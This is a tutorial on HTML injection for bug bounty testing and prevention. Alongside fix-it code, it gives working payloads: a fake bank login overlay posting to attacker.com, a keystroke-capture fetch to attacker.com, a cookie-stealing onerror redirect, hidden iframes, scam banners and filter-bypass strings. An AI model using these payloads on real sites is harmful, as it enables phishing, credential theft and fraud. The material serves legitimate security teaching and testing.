# HTML Injection — 

---

## What is HTML Injection?

HTML Injection occurs when a web application takes **user-supplied input** and displays it directly on the page **without proper sanitization**, allowing the browser to interpret it as real HTML code instead of plain text.

```
Normal behavior:
User types:    <h1>Hello</h1>
Page displays: <h1>Hello</h1>  ← shown as text

Vulnerable behavior:
User types:    <h1>Hello</h1>
Page displays: Hello            ← rendered as large heading!
```

---

## How HTML Injection Works — Core Concept

```
┌─────────────────────────────────────────────────────┐
│                  Normal Flow                         │
│                                                      │
│  User Input → Server → Sanitize → Display as Text   │
│  "<h1>test</h1>" → encode → "&lt;h1&gt;test&lt;/h1&gt;" │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│                Vulnerable Flow                       │
│                                                      │
│  User Input → Server → NO Sanitize → Render as HTML │
│  "<h1>test</h1>" → directly inserted → BIG TEXT!    │
└─────────────────────────────────────────────────────┘
```

---

## Types of HTML Injection

### 1. Reflected HTML Injection
The malicious input is **immediately reflected** back in the response:
```
# URL-based injection
https://example.com/search?q=<h1>Hacked</h1>

# The page shows:
<div class="results">
  Search results for: <h1>Hacked</h1>    ← rendered!
</div>
```

### 2. Stored HTML Injection
The malicious input is **saved in the database** and shown to all users:
```
# Comment box injection
User submits comment:
<marquee><h1 style="color:red">HACKED</h1></marquee>

# Every visitor now sees this rendered on the page!
# Much more dangerous than reflected
```

### 3. DOM-Based HTML Injection
The injection happens **entirely in the browser** via JavaScript:
```javascript
// Vulnerable JavaScript code
document.getElementById('welcome').innerHTML = 
    "Hello " + location.hash.substring(1);

// Attacker sends victim:
https://example.com/page#<img src=x onerror=alert(1)>

// The # value is injected directly into innerHTML
// No server involved at all!
```

---

## Where to Find HTML Injection

### Common Injection Points
```
Input fields:
├── Search boxes          ← most common
├── Comment sections      ← stored injection
├── Username/profile      ← stored, affects many users
├── Feedback forms        ← stored
├── Bio/description       ← stored
├── Error messages        ← reflected
├── 404 pages             ← reflected URL in page
└── Email fields          ← sometimes rendered in emails

URL parameters:
├── ?name=INJECT
├── ?message=INJECT
├── ?redirect=INJECT
└── ?error=INJECT

HTTP Headers:
├── Referer header        ← shown in analytics pages
├── User-Agent            ← shown in admin dashboards
└── X-Forwarded-For       ← shown in logs/dashboards
```

---

## Testing for HTML Injection — Step by Step

### Basic Test Payloads
```html
<!-- Level 1 — Simple tags -->
<h1>HTML Injection Test</h1>
<b>Bold Text Test</b>
<i>Italic Test</i>
<u>Underline Test</u>

<!-- Level 2 — Visual indicators -->
<marquee>Moving Text</marquee>
<blink>Blinking Text</blink>
<hr>
<br><br><br>

<!-- Level 3 — Styled injections -->
<h1 style="color:red">RED TEXT</h1>
<div style="background:black;color:white;padding:20px">Dark Box</div>
<p style="font-size:50px">HUGE TEXT</p>

<!-- Level 4 — Interactive elements -->
<a href="http://evil.com">Click Here</a>
<button onclick="">Click Me</button>
<input type="text" value="injected">

<!-- Level 5 — Forms (phishing test) -->
<form action="http://attacker.com">
  <input type="text" name="user" placeholder="Username">
  <input type="password" name="pass" placeholder="Password">
  <input type="submit" value="Login">
</form>
```

### Testing via URL
```bash
# Test URL parameters
curl "https://example.com/search?q=<h1>test</h1>"

# Check if it appears in response unencoded
curl "https://example.com/search?q=<h1>test</h1>" | grep "<h1>test</h1>"

# If found unencoded → VULNERABLE!
# If found as &lt;h1&gt; → protected

# Test with Burp Suite
# 1. Intercept request
# 2. Send to Repeater
# 3. Inject HTML in parameters
# 4. Check response
```

### Testing via Forms
```
1. Find any input field (search, comment, name, etc.)
2. Type: <h1>HTMLTest</h1>
3. Submit the form
4. Check if page shows:
   → Large heading "HTMLTest" = VULNERABLE ✅
   → The literal text "<h1>HTMLTest</h1>" = PROTECTED ✅
   → Nothing = May be filtered, try other payloads
```

---

## Attack Scenarios — Deep Dive

### 1. Phishing Attack — Fake Login Form
```html
<!-- Injected into a vulnerable search page -->
<!-- URL: https://bank.com/search?q=PAYLOAD -->

<div style="
  position:fixed;
  top:0; left:0;
  width:100%; height:100%;
  background:white;
  z-index:9999;
  display:flex;
  justify-content:center;
  align-items:center;
">
  <div style="
    border:1px solid #ccc;
    padding:30px;
    border-radius:5px;
    box-shadow:0 2px 10px rgba(0,0,0,0.3);
    font-family:Arial;
    width:300px;
  ">
    <img src="https://bank.com/logo.png" style="width:100%">
    <h3 style="color:#333">Security Alert</h3>
    <p style="color:red">Your session has expired. 
       Please verify your identity.</p>
    <form action="https://attacker.com/steal" method="POST">
      <input type="text" name="user" 
             placeholder="Username"
             style="width:100%;padding:8px;margin:5px 0">
      <input type="password" name="pass" 
             placeholder="Password"
             style="width:100%;padding:8px;margin:5px 0">
      <input type="hidden" name="src" value="bank.com">
      <button type="submit" style="
        width:100%;
        background:#0066cc;
        color:white;
        padding:10px;
        border:none;
        border-radius:3px;
        cursor:pointer;
      ">Verify Identity</button>
    </form>
  </div>
</div>

<!-- Victim sees a fake login form on the REAL bank domain!
     The URL bar still shows bank.com → very convincing! -->
```

### 2. Content Spoofing / Defacement
```html
<!-- Replace entire page content -->
<div style="
  position:fixed;
  top:0;left:0;
  width:100%;height:100%;
  background:#000;
  color:#f00;
  z-index:99999;
  text-align:center;
  font-family:monospace;
">
  <h1>⚠️ SITE HACKED ⚠️</h1>
  <p>Your data has been compromised</p>
  <p>Contact: hacker@evil.com</p>
</div>

<!-- Used for:
     - Reputation damage
     - Spreading misinformation
     - Social engineering
     - Fake security alerts -->
```

### 3. Redirect Attack
```html
<!-- Immediate redirect -->
<meta http-equiv="refresh" content="0; URL=https://phishing-site.com">

<!-- Delayed redirect (less suspicious) -->
<meta http-equiv="refresh" content="3; URL=https://phishing-site.com">
<!-- "You will be redirected in 3 seconds..." -->

<!-- JavaScript redirect via HTML event -->
<img src="x" onerror="window.location='https://evil.com'">

<!-- Hidden iframe (for clickjacking) -->
<iframe src="https://evil.com" 
        style="opacity:0;position:absolute;top:0;left:0;
               width:100%;height:100%">
</iframe>
```

### 4. Credential Harvesting via Email
```html
<!-- If a site sends HTML emails with user input unescaped -->
<!-- Attacker sets their name to: -->

<a href="https://attacker.com/reset?token=steal">
  Click here to verify your account
</a>

<!-- Email recipient sees a legit-looking link 
     but it goes to attacker's server! -->
```

### 5. Keylogger via HTML Injection
```html
<!-- Inject hidden form that captures keystrokes -->
<div style="position:absolute;opacity:0;width:0;height:0;overflow:hidden">
  <input type="text" 
         onfocus="this.style.opacity=0"
         onkeyup="
           fetch('https://attacker.com/log?k='+this.value)
         ">
</div>
```

### 6. Social Engineering with Alerts
```html
<!-- Fake security warnings -->
<div style="
  background:#ff0000;
  color:white;
  padding:20px;
  font-size:20px;
  text-align:center;
  position:fixed;
  top:0;width:100%;z-index:9999
">
  ⚠️ VIRUS DETECTED! Call 1-800-FAKE-HELP immediately!
  Your computer is at risk!
</div>

<!-- Used for tech support scams -->
```

---

## HTML Injection vs XSS — Detailed Comparison

```
HTML Injection:
├── Injects: HTML tags and elements
├── Executes: NO JavaScript (unless → XSS)
├── Requires: Browser to render HTML
├── Can steal: Cookies? NO (directly)
├── Danger: Medium
└── Example: <h1>Fake Content</h1>

XSS (Cross-Site Scripting):
├── Injects: JavaScript code
├── Executes: YES — full JS capabilities
├── Requires: Browser to execute scripts
├── Can steal: Cookies? YES (document.cookie)
├── Danger: High-Critical
└── Example: <script>alert(document.cookie)</script>

The Bridge Between Them:
HTML Injection can ESCALATE to XSS via:
├── Event handlers: <img src=x onerror=alert(1)>
├── JavaScript URIs: <a href="javascript:alert(1)">
├── CSS injection: <div style="background:url(javascript:alert(1))">
└── SVG tags: <svg onload=alert(1)>
```

---

## Escalating HTML Injection to XSS

```html
<!-- These payloads are HTML injection that also execute JS -->
<!-- Useful when <script> tags are blocked -->

<!-- Image error event -->
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="document.location='https://evil.com?c='+document.cookie">

<!-- SVG with onload -->
<svg onload="alert('XSS')">
<svg/onload=alert(1)>

<!-- Body event -->
<body onload="alert(1)">

<!-- Input focus -->
<input autofocus onfocus="alert(1)">

<!-- Details tag -->
<details open ontoggle="alert(1)">

<!-- Video error -->
<video src="x" onerror="alert(1)">

<!-- Anchor with javascript: -->
<a href="javascript:alert(1)">Click me</a>

<!-- CSS expression (old IE) -->
<div style="width:expression(alert(1))">
```

---

## Bypassing HTML Injection Filters

```html
<!-- If basic tags are blocked, try: -->

<!-- Case variations -->
<H1>test</H1>
<hEaD>test</hEaD>

<!-- Extra spaces -->
<h1 >test</h1>
< h1>test</h1>

<!-- Nested tags (if filter removes one layer) -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- HTML entities -->
&lt;h1&gt;test&lt;/h1&gt;      ← won't work (already encoded)
<h&#49;>test</h1>              ← decimal entity bypass

<!-- URL encoding (in URL parameters) -->
%3Ch1%3Etest%3C%2Fh1%3E

<!-- Double URL encoding -->
%253Ch1%253E

<!-- Unicode -->
<h1 style="font-family:\0068\0061\0063\006B">

<!-- Null bytes -->
<h1%00>test</h1>

<!-- Tab/newline injection -->
<h1
>test</h1>
```

---

## Using Burp Suite for HTML Injection Testing

```
1. SETUP:
   → Open Burp Suite
   → Configure browser proxy: 127.0.0.1:8080
   → Turn Intercept ON

2. FIND INJECTION POINTS:
   → Browse target website
   → Look for forms and URL parameters
   → Every input = potential injection point

3. TEST WITH REPEATER:
   → Capture request in Burp
   → Send to Repeater (Ctrl+R)
   → Modify parameter value to: <h1>test</h1>
   → Click Send
   → Check Response for unencoded <h1>

4. TEST WITH INTRUDER:
   → Send to Intruder (Ctrl+I)
   → Mark injection position
   → Load HTML payload list
   → Start attack
   → Look for different response lengths

5. USE SCANNER:
   → Right-click request
   → "Scan this insertion point"
   → Check for HTML injection findings
```

---

## Complete Testing Checklist

```
DISCOVERY:
☐ Test all input fields (forms, search, comments)
☐ Test all URL parameters (?q=, ?name=, ?msg=)
☐ Test HTTP headers (User-Agent, Referer)
☐ Test cookie values
☐ Test hidden form fields
☐ Test file upload names
☐ Test JSON/XML input fields

BASIC TESTS:
☐ <h1>test</h1>        → heading rendered?
☐ <b>test</b>          → bold rendered?
☐ <marquee>test</marquee> → scrolling?
☐ <hr>                 → horizontal line?
☐ <img src=x>          → broken image?

ESCALATION TESTS:
☐ <img src=x onerror=alert(1)>
☐ <svg onload=alert(1)>
☐ <input autofocus onfocus=alert(1)>
☐ <a href=javascript:alert(1)>test</a>

IMPACT DEMONSTRATION:
☐ Inject fake login form
☐ Inject redirect
☐ Inject defacement content
☐ Create compelling PoC for report
```

---

## Prevention — Developer Guide

### 1. Output Encoding
```python
# Python
import html
user_input = "<h1>Hello</h1>"
safe_output = html.escape(user_input)
# Result: &lt;h1&gt;Hello&lt;/h1&gt;
```

```php
# PHP
$user_input = "<h1>Hello</h1>";
$safe_output = htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
# Result: &lt;h1&gt;Hello&lt;/h1&gt;

# OR
$safe_output = htmlentities($user_input, ENT_QUOTES, 'UTF-8');
```

```javascript
// JavaScript
function escapeHTML(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// NEVER use innerHTML with user input:
// ❌ element.innerHTML = userInput;
// ✅ element.textContent = userInput;
```

### 2. Content Security Policy (CSP)
```http
# Strict CSP header
Content-Security-Policy: 
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self' data:;
  form-action 'self';
  frame-ancestors 'none';

# This prevents:
# → External script loading
# → Inline script execution
# → Form submission to external sites
# → Clickjacking via iframes
```

### 3. Input Validation
```python
# Whitelist approach — only allow expected characters
import re

def validate_name(name):
    # Only letters, spaces, hyphens
    if not re.match(r'^[a-zA-Z\s\-]{1,50}$', name):
        raise ValueError("Invalid name format")
    return name

def validate_search(query):
    # Remove HTML tags entirely
    clean = re.sub(r'<[^>]+>', '', query)
    return clean[:100]  # also limit length
```

### 4. Use Safe Templating
```python
# Jinja2 (Python) — auto-escapes by default
from jinja2 import Environment
env = Environment(autoescape=True)

# ❌ Unsafe
template = env.from_string("Hello {{ name | safe }}")

# ✅ Safe (default)
template = env.from_string("Hello {{ name }}")
```

```jsx
// React — safe by default
// ❌ Dangerous
<div dangerouslySetInnerHTML={{__html: userInput}} />

// ✅ Safe
<div>{userInput}</div>  // automatically escaped
```

---

## Bug Bounty Report Template

```markdown
# HTML Injection Vulnerability

## Summary
HTML Injection vulnerability found in [parameter] at [URL] 
allows attackers to inject arbitrary HTML into the page.

## Severity: Low-Medium

## Steps to Reproduce
1. Navigate to: https://example.com/search
2. Enter the following in the search field:
   <h1 style="color:red">HTML Injection Test</h1>
3. Click Search
4. Observe that the heading is rendered as HTML

## Proof of Concept
[Screenshot showing HTML rendered on page]

## Impact
- Phishing attacks via injected fake login forms
- Page defacement and content spoofing
- Potential escalation to XSS via event handlers
- User redirection to malicious sites

## Remediation
- Encode all user input using htmlspecialchars()
- Implement Content Security Policy headers
- Use textContent instead of innerHTML in JavaScript

## CVSS Score: 4.3 (Medium)
```

---

## Bug Bounty Severity Guide

| Finding | Severity | Payout |
|---|---|---|
| Reflected HTML Injection (no impact PoC) | Low 🟡 | $50–$200 |
| Stored HTML Injection (affects all users) | Medium 🟠 | $200–$500 |
| HTML Injection → Phishing PoC | Medium 🟠 | $300–$1,000 |
| HTML Injection → XSS escalation | High 🟠 | $500–$5,000 |
| Stored HTML → XSS on high-traffic page | Critical 🔴 | $1,000–$10,000 |

---

## Key Takeaway

> HTML Injection may seem like a **minor cosmetic issue**, but in the hands of a skilled attacker it becomes a powerful **social engineering weapon**. A convincing fake login form injected into a legitimate banking website is far more dangerous than its low severity rating suggests. Always report it, always escalate your PoC to show maximum impact, and always check if it can be escalated to **XSS** — because often it can! 🛡️
